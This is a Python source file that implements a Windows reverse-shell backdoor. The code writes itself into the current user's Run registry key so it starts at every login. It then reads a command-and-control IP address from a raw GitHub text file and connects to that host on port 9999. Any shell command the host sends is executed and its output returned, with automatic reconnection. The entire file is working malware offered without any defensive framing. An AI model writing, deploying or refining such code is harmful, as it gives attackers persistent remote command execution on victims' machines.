import socket
import subprocess
import requests
import time
import os
import sys
import winreg as reg  # Import winreg for Windows registry operations

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def fetch_server_ip(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()
    except Exception as e:
        return None

def connect_to_server(server_ip, port=9999):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, port))
            
            while True:
                command = client_socket.recv(1024)
                if not command:
                    break  # Break the loop if no more data is received
                if command.strip().lower() == b'exit':  # Decode and compare
                    break
                output = execute_command(command.decode('utf-8').strip())
                client_socket.sendall(output.encode('utf-8'))
        except ConnectionResetError:
            print("Server closed the connection.")
            break
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(5)  # Retry every 5 seconds if connection fails
        finally:
            client_socket.close()


def add_to_startup(app_name, app_path):
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
        reg.CloseKey(reg_key)
    except WindowsError as e:
        print(f'Failed to add {app_name} to startup: {e}')

if __name__ == '__main__':
    script_name = os.path.basename(sys.argv[0])  # Get the name of the current script
    app_name = script_name  # Use the script's name as the registry entry name
    app_path = os.path.abspath(sys.argv[0])  # Path to the current script
    add_to_startup(app_name, app_path)  # Call add_to_startup with correct arguments

    server_url = "https://raw.githubusercontent.com/AhmedPythonCoder/server-client/main/host.txt"
    while True:
        server_ip = fetch_server_ip(server_url)
        if server_ip:
            connect_to_server(server_ip)
        else:
            time.sleep(5)
